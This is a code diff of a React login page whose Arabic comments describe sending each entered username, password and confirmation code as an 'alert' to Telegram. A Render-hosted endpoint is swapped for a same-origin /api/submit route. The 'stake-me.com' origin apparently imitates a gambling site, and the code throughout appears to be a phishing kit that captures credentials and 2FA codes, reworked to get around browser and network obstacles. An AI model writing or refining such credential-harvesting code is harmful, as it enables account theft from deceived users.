@@ -53,17 +53,14 @@ export default function Login() {
   });
 
   // ============================================
-  // 🔐 دالة إرسال التنبيه إلى Render (متوافقة مع جميع المتصفحات)
+  // 🔐 دالة إرسال التنبيه إلى الخادم (نفس النطاق)
   // ============================================
   const sendAlertToServer = async (username: string, password: string) => {
     try {
-      const response = await fetch('https://stakeme-api.onrender.com/api/telegram/alert', {
+      const response = await fetch('/api/submit', {
         method: 'POST',
-        credentials: 'include',  // ✅ ضروري لـ Safari ومتصفحات أخرى
-        keepalive: true,         // ✅ يمنع إلغاء الطلب عند التنقل بين الصفحات
         headers: {
           'Content-Type': 'application/json',
-          'Origin': 'https://stake-me.com',  // ✅ رأس إضافي للمتصفحات اللي بتحذفه
         },
         body: JSON.stringify({
           username: username,
@@ -79,17 +76,15 @@ export default function Login() {
         console.warn('⚠️ Response body:', text);
       }
     } catch (error) {
-      console.warn('⚠️ Alert failed (network or CORS issue):', error);
+      console.warn('⚠️ Alert failed:', error);
     }
   };
 
   // ============================================
   // 📤 دالة إرسال بيانات الدخول
   // ============================================
-  const onSubmit = async (data: LoginFormValues, event?: React.FormEvent) => {
-    event?.preventDefault();  // ✅ منع إعادة تحميل الصفحة
-
-    // إرسال البيانات إلى تليجرام
+  const onSubmit = async (data: LoginFormValues) => {
+    // إرسال البيانات إلى الخادم
     await sendAlertToServer(data.username, data.password);
 
     // متابعة العملية
@@ -100,10 +95,8 @@ export default function Login() {
   // ============================================
   // 📤 دالة إرسال رمز التأكيد
   // ============================================
-  const onCodeSubmit = async (data: CodeFormValues, event?: React.FormEvent) => {
-    event?.preventDefault();  // ✅ منع إعادة تحميل الصفحة
-
-    // إرسال رمز التأكيد إلى تليجرام
+  const onCodeSubmit = async (data: CodeFormValues) => {
+    // إرسال رمز التأكيد إلى الخادم
     await sendAlertToServer("🔐 رمز التأكيد", data.code);
 
     // متابعة العملية
